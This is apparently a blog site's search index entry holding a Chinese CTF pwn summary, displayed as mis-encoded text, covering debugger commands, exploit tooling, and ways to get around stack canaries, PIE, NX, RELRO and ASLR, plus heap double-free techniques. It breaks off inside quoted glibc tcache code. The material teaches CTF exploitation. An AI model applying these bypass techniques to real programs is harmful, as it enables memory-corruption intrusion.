<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>pwnæ€»ç»“</title>
    <link href="/2024/01/26/pwn%E6%80%BB%E7%BB%93/"/>
    <url>/2024/01/26/pwn%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€</h2><p>æˆ‘è§‰å¾—ctfçš„pwné¢˜å°±åƒæ˜¯è®¾è®¡ç²¾å·§çš„ç²ç‘æœºå…³ç›’ï¼Œæ¢é™©è€…å…‹æœé‡é‡å›°éš¾ï¼Œæ‰¾åˆ°é¢„è®¾çš„æˆåŠŸä¹‹è·¯ï¼Œæ‹¿ä¸‹èƒœåˆ©ä¹‹æ——ï¼Œæˆ–æ˜¯å¦è¾Ÿè¹Šå¾„ğŸ˜‚</p><p>æœ¬æ–‡ä»…ä½œä¸€ä¸ªå¤§è‡´æè¿°ï¼Œåƒä¸€ä¸ªæ¡†æ¶</p><h2 id="User-Mode">User Mode</h2><p>ä¸€èˆ¬éƒ½æ˜¯ç»™ä¸ªlinuxäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œé¢˜ç›®é¢„å…ˆè®¾è®¡å¥½äº†æŸä¸ªæ¼æ´ï¼Œç„¶åä½ èƒ½åˆ©ç”¨æ¼æ´ï¼Œè¾¾æˆä»»æ„åœ°å€è¯»/å†™ï¼Œæ§åˆ¶ç¨‹åºæµï¼Œè¾¾æˆgetshellæˆ–orwè¯»flagä»€ä¹ˆçš„</p><p>ä¸€èˆ¬åšé¢˜æ­¥éª¤ï¼š</p><p>1.ä¸€èˆ¬æ‹¿åˆ°ç¨‹åºå…ˆchecksecçœ‹ä¸‹ä¿æŠ¤ï¼Œç„¶åè¿è¡Œä¸‹ç¨‹åºï¼Œçœ‹çœ‹åŠŸèƒ½ï¼Œç®€å•åšäº›äº¤äº’ï¼Œçœ‹çœ‹ä¼šä¸ä¼šsegmentation faultè¿™ç§æŠ¥é”™</p><p>2.ç„¶åç”¨idaåˆ†æé‚£ä¸ªäºŒè¿›åˆ¶ç¨‹åºçš„ä¼ªä»£ç ï¼Œè¯»æ‡‚ç¨‹åºï¼Œæ‰¾æ¼æ´</p><p>3.æ€è€ƒåˆ©ç”¨æ–¹æ³•ï¼Œé…åˆdbgè°ƒè¯•ï¼Œç¼–å†™å‡ºexp</p><h3 id="Tools">Tools</h3><h4 id="IDA-Pro">IDA Pro</h4><p>idaåœ¨pwnä¸­ç”¨çš„ä¸æ·±ï¼Œä¼šä¸€äº›åŸºæœ¬çš„ï¼Œç„¶åä¼šIDA_Patchå³å¯</p><p>F5åæ±‡ç¼–</p><p>å»äº†ç¬¦å·è¡¨çš„é¢˜ï¼ŒåŠ ç­¾åæ–‡ä»¶ï¼Œå¯ä»¥æ˜¾ç¤ºéƒ¨åˆ†å‡½æ•°å</p><h4 id="pwndbg-peda-gef">pwndbg/peda/gef</h4><p>ä¸‰è€…æˆ‘è®¤ä¸ºpwndbgæœ€å¥½ç”¨ï¼Œæœ‰ä¸€äº›å¥½ç”¨çš„æŒ‡ä»¤ï¼Œä¹Ÿä¸å¤ªå¡</p><ul><li><p>åŸºæœ¬æŒ‡ä»¤</p><ul><li>si//å•æ­¥æ­¥å…¥ï¼Œé‡åˆ°è°ƒç”¨è·Ÿè¿›å‡½æ•°ä¸­</li><li>ni //å•æ­¥æ­¥è¿‡ï¼Œé‡åˆ°å‡½æ•°ä¸è·Ÿè¿›</li><li>b *åœ°å€//æ®µæŒ‡å®šåœ°å€ï¼Œb *main</li><li>b *$ rebase(0x123456) //$rebase åœ¨è°ƒè¯•å¼€PIEçš„ç¨‹åºçš„æ—¶å€™å¯ä»¥ç›´æ¥åŠ ä¸Šç¨‹åºçš„éšæœºåœ°å€</li><li>vmmap //å†…å­˜åˆ†é…æƒ…å†µ</li><li>r//è¿è¡Œ</li><li>c//ç»§ç»­</li></ul></li><li><p>æŸ¥çœ‹å†…å­˜æŒ‡ä»¤x</p><ul><li>x/32gx åœ°å€  //æˆ‘å–œæ¬¢ç”¨è¿™ä¸ªï¼Œæ‰“å°åœ°å€çš„å†…å®¹ä»¥16è¿›åˆ¶</li><li>x /10i 0x123456 //ä»0x123456å¤„å‘åæ˜¾ç¤ºåæ¡æ±‡ç¼–æŒ‡ä»¤</li></ul></li><li><p>æ‰“å°æŒ‡ä»¤p</p></li><li><p>ä¿®æ”¹æŒ‡ä»¤set</p><ul><li><code>set $rdi=0x10</code> //æŠŠrdiå¯„å­˜å™¨çš„å€¼å˜ä¸º0x10</li><li><code>set *(0x123456)=0x10</code> //0x123456åœ°å€çš„å€¼å˜ä¸º0x10ï¼Œ<strong>æ³¨æ„å¸¦æ˜Ÿå·</strong></li></ul></li><li><p>å †æ“ä½œæŒ‡ä»¤</p><ul><li><p><code>arena</code> //æ˜¾ç¤ºarenaçš„è¯¦ç»†ä¿¡æ¯</p><ul><li><code>arenas</code> //æ˜¾ç¤ºæ‰€æœ‰arenaçš„åŸºæœ¬ä¿¡æ¯</li><li><code>arenainfo</code> //<strong>å¥½çœ‹çš„æ˜¾ç¤º</strong>æ‰€æœ‰arenaçš„ä¿¡æ¯</li></ul></li><li><p><code>bins</code> //</p><p>å¸¸ç”¨ï¼ŒæŸ¥çœ‹æ‰€æœ‰ç§ç±»çš„å †å—çš„é“¾è¡¨æƒ…å†µ</p><ul><li><code>fastbins</code> //å•ç‹¬æŸ¥çœ‹fastbinsçš„é“¾è¡¨æƒ…å†µ</li><li><code>largebins</code> //åŒä¸Šï¼Œå•ç‹¬æŸ¥çœ‹largebinsçš„é“¾è¡¨æƒ…å†µ</li><li><code>smallbins</code> //åŒä¸Šï¼Œå•ç‹¬æŸ¥çœ‹smallbinsçš„é“¾è¡¨æƒ…å†µ</li><li><code>unsortedbin</code> //åŒä¸Šï¼Œå•ç‹¬æŸ¥çœ‹unsortedbiné“¾è¡¨æƒ…å†µ</li><li><code>tcachebins</code> //åŒä¸Šï¼Œå•ç‹¬æŸ¥çœ‹tcachebinsçš„é“¾è¡¨æƒ…å†µ</li><li><code>tcache</code> //æŸ¥çœ‹tcacheè¯¦ç»†ä¿¡æ¯</li></ul></li><li><p><code>heap</code> //</p><p>æ•°æ®ç»“æ„çš„å½¢å¼æ˜¾ç¤ºæ‰€æœ‰å †å—ï¼Œä¼šæ˜¾ç¤ºä¸€å¤§å †</p><ul><li><code>heapbase</code> //<strong>æŸ¥çœ‹å †èµ·å§‹åœ°å€</strong></li><li><code>heapinfo</code>ã€<code>heapinfoall</code> //æ˜¾ç¤ºå †å¾—ä¿¡æ¯ï¼Œå’Œbinsçš„æŒºåƒçš„ï¼Œ<strong>æ²¡binså¥½ç”¨</strong></li><li><code>parseheap</code> //æ˜¾ç¤ºå †ç»“æ„ï¼Œ<strong>å¾ˆå¥½ç”¨</strong></li></ul></li><li><p><code>tracemalloc</code> //<strong>å¥½ç”¨</strong>ï¼Œä¼šè·Ÿæç¤ºæ‰€æœ‰æ“ä½œå †çš„åœ°æ–¹</p></li></ul></li><li><p>å…¶ä»–pwndbgæ’ä»¶ç‹¬æœ‰æŒ‡ä»¤</p><ul><li><code>cyclic 50</code> //ç”Ÿæˆ50ä¸ªç”¨æ¥æº¢å‡ºçš„å­—ç¬¦ï¼Œå¦‚ï¼šaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama</li><li><code>$reabse</code> //<strong>å¼€å¯PIEçš„æƒ…å†µçš„åœ°å€åç§»</strong><ul><li><code>b *$reabse(0x123456)</code> //æ–­ä½PIEçŠ¶æ€ä¸‹çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸­0x123456çš„åœ°æ–¹</li><li><code>codebase</code> //æ‰“å°PIEåç§»ï¼Œ<strong>ä¸rebaseä¸åŒï¼Œè¿™æ˜¯æ‰“å°ï¼Œrebaseæ˜¯ä½¿ç”¨</strong></li></ul></li><li><code>stack</code> //<strong>æŸ¥çœ‹æ ˆ</strong></li><li><code>retaddr</code> //æ‰“å°åŒ…å«è¿”å›åœ°å€çš„æ ˆåœ°å€</li><li><code>canary</code> //ç›´æ¥çœ‹canaryçš„å€¼</li><li><code>plt</code> //æŸ¥çœ‹pltè¡¨</li><li><code>got</code> //æŸ¥çœ‹gotè¡¨</li><li><code>hexdump</code> //åƒIDAé‚£æ ·æ˜¾ç¤ºæ•°æ®ï¼Œ<strong>å¸¦å­—ç¬¦ä¸²</strong></li></ul></li></ul><h4 id="pwntools">pwntools</h4><p>å¿…å¤‡çš„åº“ï¼Œå¯ä»¥å¤§å¤§åŠ å¿«ç”¨pythonç¼–å†™expçš„é€Ÿåº¦</p><h4 id="seccomp-tools">seccomp-tools</h4><p>Secommp (SECure COMPuting) æ˜¯ Linux å†…æ ¸ 2.6.12 ç‰ˆæœ¬å¼•å…¥çš„å®‰å…¨æ¨¡å—ï¼Œä¸»è¦æ˜¯ç”¨æ¥é™åˆ¶æŸä¸€è¿›ç¨‹å¯ç”¨çš„ç³»ç»Ÿè°ƒç”¨ (system call)ã€‚</p><p>æˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªå·¥å…·æ¥å¯ä»¥åˆ†æç¨‹åºçš„seccompçŠ¶æ€ï¼Œçœ‹ç¦ç”¨äº†å“ªäº›ç³»ç»Ÿè°ƒç”¨</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">seccomp-tools dump ./pwn<br></code></pre></td></tr></table></figure><h4 id="patchelf">patchelf</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">patchelf --replace-needed libc.so.6 ä½ è¦æ¢çš„libcçš„ç¡¬è·¯å¾„ ./pwn<br>patchelf --set-interpreter ldçš„ç¡¬è·¯å¾„ ./pwn<br></code></pre></td></tr></table></figure><h4 id="one-gadget">one_gadget</h4><p>å¯ä»¥è®¾ç½®å‚æ•°æŸ¥æ‰¾ç­‰çº§ï¼Œæ‰¾åˆ°æ›´å¤šå¯ç”¨çš„gadget</p><p>æœ‰æ—¶æ‰¾å‡ºæ¥çš„gadgetç”¨ä¸äº†ï¼Œè¦ç”¨realloc</p><h3 id="Defense">Defense</h3><h4 id="Canary">Canary</h4><p>canaryæ˜¯ä¸€ç§ç”¨æ¥é˜²æŠ¤æ ˆæº¢å‡ºçš„ä¿æŠ¤æœºåˆ¶ã€‚åŸç†æ˜¯åœ¨ä¸€ä¸ªå‡½æ•°çš„å…¥å£å¤„ï¼Œå…ˆä»fs/gså¯„å­˜å™¨ä¸­å–å‡ºä¸€ä¸ª4å­—èŠ‚(eax)æˆ–è€…8å­—èŠ‚(rax)çš„å€¼å­˜åˆ°æ ˆä¸Šï¼Œå½“å‡½æ•°ç»“æŸæ—¶ä¼šæ£€æŸ¥è¿™ä¸ªæ ˆä¸Šçš„å€¼æ˜¯å¦å’Œå­˜è¿›å»çš„å€¼ä¸€è‡´</p><p>è‹¥ä¸€è‡´åˆ™æ­£å¸¸é€€å‡ºï¼Œå¦‚æœæ˜¯æ ˆæº¢å‡ºæˆ–è€…å…¶ä»–åŸå› å¯¼è‡´canaryçš„å€¼å‘ç”Ÿå˜åŒ–ï¼Œé‚£ä¹ˆç¨‹åºå°†æ‰§è¡Œ___stack_chk_failå‡½æ•°ï¼Œç»§è€Œç»ˆæ­¢ç¨‹åº</p><h5 id="trickï¼š">trickï¼š</h5><ul><li>å› ä¸ºcanaryæœ«å°¾æ˜¯/x00ï¼Œæœ¬èº«å¯ä»¥è¢«æˆªæ–­ï¼Œå¯ä»¥æ ˆæº¢å‡ºä¿®æ”¹æ‰æœ«å°¾çš„/x00ï¼Œé…åˆè¾“å‡ºå‡½æ•°ï¼Œæ³„éœ²canary</li><li>æŸäº›ç”¨forkå‡½æ•°çš„é¢˜ï¼Œçˆ¶å­è¿›ç¨‹çš„canaryæ˜¯ä¸€æ ·çš„ï¼Œé€ä½çˆ†ç ´canary</li><li>Stack Smashing Protect Leakï¼Œå°±æ˜¯ç”¨__stack_chk_fail()å‡½æ•°é‡Œçš„æŸä¸ªåŠŸèƒ½ï¼Œèƒ½ä»»æ„åœ°å€è¯»ï¼Œæˆ‘è®°å¾—æ—©å·²ç»ä¿®äº†è¿™ä¸ª</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">__libc_message (<span class="hljs-number">2</span>, <span class="hljs-string">&quot;*** %s ***: %s terminatedn&quot;</span>,<br>                   msg, __libc_argv[<span class="hljs-number">0</span>] ?: <span class="hljs-string">&quot;&lt;unknown&gt;&quot;</span>);<br></code></pre></td></tr></table></figure><ul><li>gotè¡¨åŠ«æŒ__stack_chk_fail</li></ul><h4 id="PIE">PIE</h4><p>PIEå…¨ç§°æ˜¯position-independent executableï¼Œä¸­æ–‡è§£é‡Šä¸ºåœ°å€æ— å…³å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè¯¥æŠ€æœ¯æ˜¯ä¸€ä¸ªé’ˆå¯¹ä»£ç æ®µï¼ˆ.textï¼‰ã€æ•°æ®æ®µï¼ˆ.dataï¼‰ã€æœªåˆå§‹åŒ–å…¨å±€å˜é‡æ®µï¼ˆ.bssï¼‰ç­‰å›ºå®šåœ°å€çš„ä¸€ä¸ªé˜²æŠ¤æŠ€æœ¯ï¼Œå¦‚æœç¨‹åºå¼€å¯äº†PIEä¿æŠ¤çš„è¯ï¼Œåœ¨æ¯æ¬¡åŠ è½½ç¨‹åºæ—¶éƒ½å˜æ¢åŠ è½½åœ°å€</p><h5 id="trickï¼š-2">trickï¼š</h5><ul><li>partial writeï¼špartial write(éƒ¨åˆ†å†™å…¥)å°±æ˜¯ä¸€ç§åˆ©ç”¨äº†PIEæŠ€æœ¯ç¼ºé™·çš„bypassæŠ€æœ¯ã€‚ç”±äºå†…å­˜çš„é¡µè½½å…¥æœºåˆ¶ï¼ŒPIEçš„éšæœºåŒ–åªèƒ½å½±å“åˆ°å•ä¸ªå†…å­˜é¡µã€‚é€šå¸¸æ¥è¯´ï¼Œä¸€ä¸ªå†…å­˜é¡µå¤§å°ä¸º0x1000ï¼Œè¿™å°±æ„å‘³ç€ä¸ç®¡åœ°å€æ€ä¹ˆå˜ï¼ŒæŸæ¡æŒ‡ä»¤çš„å12ä½ï¼Œ3ä¸ªåå…­è¿›åˆ¶æ•°çš„åœ°å€æ˜¯å§‹ç»ˆä¸å˜çš„ã€‚å› æ­¤é€šè¿‡è¦†ç›–EIPçš„å8æˆ–16ä½ (æŒ‰å­—èŠ‚å†™å…¥ï¼Œæ¯å­—èŠ‚8ä½)å°±å¯ä»¥å¿«é€Ÿçˆ†ç ´æˆ–è€…ç›´æ¥åŠ«æŒEIPã€‚</li></ul><h4 id="NX">NX</h4><p>NXå³No-eXecuteï¼ˆä¸å¯æ‰§è¡Œï¼‰çš„æ„æ€ï¼ŒNXï¼ˆDEPï¼‰çš„åŸºæœ¬åŸç†æ˜¯å°†æ•°æ®æ‰€åœ¨å†…å­˜é¡µæ ‡è¯†ä¸ºä¸å¯æ‰§è¡Œï¼Œå½“ç¨‹åºæº¢å‡ºæˆåŠŸè½¬å…¥shellcodeæ—¶ï¼Œç¨‹åºä¼šå°è¯•åœ¨æ•°æ®é¡µé¢ä¸Šæ‰§è¡ŒæŒ‡ä»¤ï¼Œæ­¤æ—¶CPUå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œä¸æ˜¯å»æ‰§è¡Œæ¶æ„æŒ‡ä»¤ã€‚</p><p>å³ä½¿æŸäº›å†…å­˜åŒºåŸŸä¸å¯æ‰§è¡Œï¼Œå¹¶ä½¿å¯æ‰§è¡ŒåŒºåŸŸä¸å¯å†™</p><p>ä¾‹ï¼šä½¿æ•°æ®ï¼Œå †æ ˆå’Œå †æ®µä¸å¯æ‰§è¡Œï¼Œè€Œä»£ç æ®µä¸å¯å†™</p><h5 id="trickï¼š-3">trickï¼š</h5><ul><li>ä¸€èˆ¬å°±æ˜¯åœ¨æ ˆè¿™å—åœ°å€æ²¡æ³•ç›´æ¥æ‰§è¡Œshellcodeï¼Œç”¨ROPæ‰§è¡Œç‰¹å®šçš„ä»£ç æ®µçš„ä»£ç ï¼Œä»¥è¾¾åˆ°æ§åˆ¶æ‰§è¡Œæµï¼Œgetshellç­‰ç›®çš„</li></ul><h4 id="RELRO">RELRO</h4><p>RELRO(RELocation Read-Only, é‡å®šä½åªè¯»), æ­¤æŠ€æœ¯ä¸»è¦é’ˆå¯¹ GOT æ”¹å†™çš„æ”»å‡»æ–¹å¼ã€‚åˆ†ä¸ºéƒ¨åˆ† <strong>RELRO(Partial RELRO)</strong> ä¸å®Œå…¨ <strong>RELRO(Full RELRO)</strong> ä¸¤ç§</p><ul><li><strong>éƒ¨åˆ† RELRO</strong>: åœ¨ç¨‹åºè£…å…¥åï¼Œå°†å…¶ä¸­ä¸€æ®µ (å¦‚<code>.dynamic</code>) æ ‡è®°ä¸ºåªè¯»ï¼Œé˜²æ­¢ç¨‹åºçš„ä¸€äº›é‡å®šä½ä¿¡æ¯è¢«ä¿®æ”¹</li><li><strong>å®Œå…¨ RELRO</strong>: åœ¨éƒ¨åˆ† RELRO çš„åŸºç¡€ä¸Šï¼Œåœ¨ ç¨‹åºè£…å…¥æ—¶ï¼Œç›´æ¥è§£æå®Œæ‰€æœ‰ç¬¦å·å¹¶å¡«å…¥å¯¹åº”çš„å€¼ï¼Œæ­¤æ—¶æ‰€æœ‰çš„ GOT è¡¨é¡¹éƒ½å·²åˆå§‹åŒ–ï¼Œä¸”ä¸è£…å…¥ <code>link_map</code> ä¸<code>_dl_runtime_resolve</code> çš„åœ°å€ (äºŒè€…éƒ½æ˜¯ç¨‹ åºåŠ¨æ€è£…è½½çš„é‡è¦ç»“æ„å’Œå‡½æ•°)ã€‚</li></ul><p>è®¾ç½®ç¬¦å·é‡å®šå‘è¡¨æ ¼ä¸ºåªè¯»æˆ–åœ¨ç¨‹åºå¯åŠ¨æ—¶å°±è§£æå¹¶ç»‘å®šæ‰€æœ‰åŠ¨æ€ç¬¦å·ï¼Œä»è€Œå‡å°‘å¯¹ GOTï¼ˆGlobal Offset Tableï¼‰æ”»å‡»ã€‚RELRO ä¸ºâ€ Partial RELROâ€, è¯´æ˜æˆ‘ä»¬å¯¹ GOT è¡¨å…·æœ‰å†™æƒé™ã€‚</p><ul><li>å½“RELROä¿æŠ¤ä¸ºNO RELROçš„æ—¶å€™ï¼Œinit.arrayã€fini.arrayã€got.pltå‡å¯è¯»å¯å†™ï¼›</li><li>ä¸ºPARTIAL RELROçš„æ—¶å€™ï¼Œini.arrayã€fini.arrayå¯è¯»ä¸å¯å†™ï¼Œgot.pltå¯è¯»å¯å†™ï¼›</li><li>ä¸ºFULL RELROæ—¶ï¼Œinit.arrayã€fini.arrayã€got.pltå‡å¯è¯»ä¸å¯å†™ã€‚</li><li>ç¨‹åºåœ¨åŠ è½½çš„æ—¶å€™ï¼Œä¼šä¾æ¬¡è°ƒç”¨init.arrayæ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œåœ¨ç»“æŸçš„æ—¶å€™ï¼Œä¾æ¬¡è°ƒç”¨fini.arrayä¸­çš„æ¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆå½“ç¨‹åºå‡ºç°æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä½†æ˜¯éœ€è¦å†™ä¸¤æ¬¡æ‰èƒ½å®Œæˆæ”»å‡»ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥è€ƒè™‘æ”¹å†™fini.arrayä¸­çš„å‡½æ•°æŒ‡é’ˆä¸ºmainå‡½æ•°åœ°å€ï¼Œå¯ä»¥å†æ‰§è¡Œä¸€æ¬¡mainå‡½æ•°ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œè¿™ä¸ªæ•°ç»„çš„é•¿åº¦ä¸º1ï¼Œä¹Ÿå°±æ˜¯è¯´åªèƒ½å†™ä¸€ä¸ªåœ°å€ã€‚</li></ul><h5 id="trickï¼š-4">trickï¼š</h5><p><strong>GOT Hijackingï¼š</strong></p><p>NO RELROä¸PARTIAL RELROæ—¶é‡‡ç”¨Lazy Bindingï¼ˆå»¶è¿Ÿç»‘å®šï¼‰æœºåˆ¶æ—¶ï¼š</p><p>å› ä¸ºä¸ä¸€å®šæ¯ä¸ªåº“å‡½æ•°éƒ½ä¼šè¢«æ‰§è¡Œåˆ°ï¼Œæ‰€ä»¥é‡‡ç”¨lazy bindingçš„æœºåˆ¶ï¼Œå½“ç¬¬ä¸€æ¬¡æ‰§è¡Œåˆ°åº“å‡½æ•°çš„æŸä¸ªåŠŸèƒ½æ—¶æ‰ä¼šå»å¯»æ‰¾çœŸæ­£çš„åœ°å€å¹¶è¿›è¡Œç»‘å®š</p><p>Global Offset Tableï¼šï¼ˆGOTï¼‰------gotå¤§æ¦‚æ”¾åœ¨.dataæ®µ-----pltå¤§æ¦‚æ”¾åœ¨.codeæ®µçš„åœ°æ–¹</p><p>æ–¹æ³•ï¼šåˆ©ç”¨ç¨‹åºä¸­æŸä¸ªæ¼æ´ï¼Œåšåˆ°ä¾‹å¦‚ä»»æ„åœ°å€å†™ï¼Œæˆ‘ä»¬å°±å¯ä»¥æŠŠé‚£ä¸ªgotä¸­çš„é‚£ä¸ªåœ°å€å†™æˆæˆ‘ä»¬è¦å»çš„åœ°å€</p><p>åœ¨call åŸæœ¬é‚£ä¸ªå‡½æ•°æ—¶ï¼Œå°±ä¼šè°ƒæˆ‘ä»¬æƒ³å»çš„åœ°å€ã€‚</p><h4 id="ALSR">ALSR</h4><p>ASLR (Address Space Layout Randomization), åœ°å€ç©ºé—´é…ç½®éšæœºåŠ è½½ï¼Œç®€ç§°åœ°å€éšæœºåŒ–</p><p><img src="/2024/01/26/pwn%E6%80%BB%E7%BB%93/ASLR.png" alt="ASLR"></p><p>åƒå›¾ä¸­heapæ®µï¼Œlibcæ®µï¼Œstackæ®µå¼€å¯ALSRä¹‹ååœ°å€éƒ½æ˜¯ä¸å›ºå®šçš„</p><p>å€¼å¾—<strong>æ³¨æ„çš„æ˜¯ALSRæ˜¯ç³»ç»Ÿçº§çš„ï¼Œè€ŒPIEæ˜¯ç¨‹åºçº§çš„ï¼Œä¸€èˆ¬æ˜¯ç³»ç»Ÿé»˜è®¤å¼€å¯ASLRçš„</strong></p><h5 id="trickï¼š-5">trickï¼š</h5><ul><li><strong>æ³„éœ²ç¨‹åºåœ°å€æ¥ç»•è¿‡ALSR</strong>: ç›®å‰å¹¿æ³›åº”ç”¨åœ¨æ“ä½œç³»ç»Ÿçš„åœ°å€éšæœºåŒ–å¤šä¸ºç²—ç²’åº¦çš„å®ç°æ–¹å¼ï¼ŒåŒä¸€æ¨¡å—ä¸­çš„æ‰€æœ‰ä»£ç ä¸æ•°æ®çš„ç›¸å¯¹åç§»å›ºå®šã€‚åªéœ€è¦é€šè¿‡ä¿¡æ¯æ³„éœ²æ¼æ´å°†æŸä¸ªæ¨¡å—ä¸­çš„ä»»ä¸€ä»£ç æŒ‡é’ˆæˆ–è€…æ•°æ®æŒ‡é’ˆæ³„éœ²ï¼Œå³å¯é€šè¿‡è®¡ç®—å¾—åˆ°æ­¤æ¨¡å—ä¸­ä»»æ„ä»£ç æˆ–æ•°æ®çš„åœ°å€</li></ul><h4 id="FORTIFY">FORTIFY</h4><p>fority ç”¨äºæ£€æŸ¥æ˜¯å¦å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºçš„é”™è¯¯ï¼Œæ˜¯éå¸¸è½»å¾®çš„æ£€æŸ¥ã€‚é€‚ç”¨æƒ…å½¢æ˜¯ç¨‹åºé‡‡ç”¨å¤§é‡çš„å­—ç¬¦ä¸²æˆ–è€…å†…å­˜æ“ä½œå‡½æ•°ï¼Œå¦‚ memcpy, memset, stpcpy, strcpy, strncpy, strcat, strncat, sprintf, snprintf, vsprintf, vsnprintf, gets ä»¥åŠå®½å­—ç¬¦çš„å˜ä½“ã€‚</p><h3 id="Types-of-vulnerabilities">Types of vulnerabilities</h3><h4 id="Stack-Overflow">Stack Overflow</h4><p>æ ˆæº¢å‡ºæŒ‡çš„æ˜¯ç¨‹åºå‘æ ˆä¸­æŸä¸ªå˜é‡ä¸­å†™å…¥çš„å­—èŠ‚æ•°è¶…è¿‡äº†è¿™ä¸ªå˜é‡æœ¬èº«æ‰€ç”³è¯·çš„å­—èŠ‚æ•°ï¼Œå› è€Œå¯¼è‡´ä¸å…¶ç›¸é‚»çš„æ ˆä¸­çš„å˜é‡çš„å€¼è¢«æ”¹å˜ã€‚è¿™ç§é—®é¢˜æ˜¯ä¸€ç§ç‰¹å®šçš„ç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œç±»ä¼¼çš„è¿˜æœ‰å †æº¢å‡ºï¼Œbss æ®µæº¢å‡ºç­‰æº¢å‡ºæ–¹å¼ã€‚</p><h4 id="Heap-Overflow">Heap Overflow</h4><p>å †æº¢å‡ºæ˜¯æŒ‡ç¨‹åºå‘æŸä¸ªå †å—ä¸­å†™å…¥çš„å­—èŠ‚æ•°è¶…è¿‡äº†å †å—æœ¬èº«å¯ä½¿ç”¨çš„å­—èŠ‚æ•°ï¼Œå› è€Œå¯¼è‡´äº†æ•°æ®æº¢å‡ºï¼Œå¹¶è¦†ç›–åˆ°ç‰©ç†ç›¸é‚»çš„é«˜åœ°å€çš„ä¸‹ä¸€ä¸ªå †å—ã€‚</p><p>æˆ‘ä»¬åœ¨ç†Ÿæ‚‰å †æœºåˆ¶çš„æƒ…å†µä¸‹ï¼Œè¿ç”¨ä½ é«˜è¶…çš„å †é£æ°´æŠ€å·§ï¼Œä¼ªé€ å †ç»“æ„ä½“ï¼Œä¼ªé€ I/O Fileç»“æ„ä½“ç­‰ï¼Œè¾¾æˆä»»æ„åœ°å€è¯»å†™ï¼Œæˆ–è€…æ›´ä¸¥æ ¼ç‚¹ï¼Œåœ¨ç‰¹å®šä½ç½®å†™å…¥ç‰¹å®šå€¼ï¼Œå°±å¯ä»¥æ§åˆ¶ç¨‹åºgetshellç­‰</p><h4 id="Use-After-Free">Use After Free</h4><p>å­—é¢æ„æ€ï¼Œå³å½“ä¸€ä¸ªå†…å­˜å—è¢«é‡Šæ”¾ä¹‹åå†æ¬¡è¢«ä½¿ç”¨</p><h5 id="å‘ç”ŸUAFçš„æƒ…å†µï¼š">å‘ç”ŸUAFçš„æƒ…å†µï¼š</h5><ul><li>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è®¾ç½®ä¸º NULL</li></ul><h5 id="double-free">double free</h5><ul><li>åœ¨glibc2.27ä¹‹å‰ï¼Œä¸»è¦æ˜¯fastbin double freeï¼š<br>fastbinåœ¨freeæ—¶åªä¼šæ£€æŸ¥ç°åœ¨é‡Šæ”¾çš„chunkï¼Œæ˜¯ä¸æ˜¯å¼€å¤´çš„chunkï¼Œå› æ­¤å¯ä»¥é€šè¿‡free(C1), free(C2), free(C1)çš„æ‰‹æ³•ç»•è¿‡<br>å¹¶åœ¨åœ¨fastbinå–å‡ºæ—¶ï¼Œä¼šæ£€æŸ¥sizeå­—æ®µæ˜¯ä¸æ˜¯å±äºè¿™ä¸ªfastbinï¼Œå› æ­¤å¾€å¾€éœ€è¦ä¼ªé€ ä¸€ä¸ªsize</li><li>glibc2.27~glibc2.28ï¼Œä¸»è¦æ˜¯tcache double free<br>ç›¸è¾ƒäºfastbin double freeï¼Œtcacheå®Œå…¨æ²¡æœ‰ä»»ä½•æ£€æŸ¥ï¼Œåªéœ€è¦free(C1), free(C1)å°±å¯ä»¥æ„é€ ä¸€ä¸ªç¯å‡ºæ¥</li><li>glibc2.29ï½glibc2.3Xï¼ŒtcacheåŠ å…¥äº†æ£€æŸ¥æœºåˆ¶,ç¼–è¾‘freeåçš„å †ç»•è¿‡çš„doublefreeæ£€æµ‹</li></ul><h6 id="æ£€æµ‹ï¼š">æ£€æµ‹ï¼š</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> tc_idx = csize2tidx(size);<br><span class="hljs-comment">//åªè¦tcacheä¸ä¸ºç©ºï¼Œå¹¶ä¸”è¿™ä¸ªchunkå±äºtcacheç®¡è¾–èŒƒå›´ï¼Œé‚£ä¹ˆè¿™ä¸ªchunkå°±æœ‰å¯èƒ½å·²ç»åœ¨tcacheä¸­äº†ï¼Œæ‰€ä»¥éœ€è¦double freeæ£€æŸ¥</span><br><span class="hljs-keyword">if</span> (tcache != <span class="hljs-literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>&#123;<br>  <span class="hljs-comment">/* Check to see if it&#x27;s already in the tcache.  */</span><br>  tcache_entry *e = (tcache_entry *)chunk2mem(p);<br> <br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">    å¦‚æœæ˜¯double 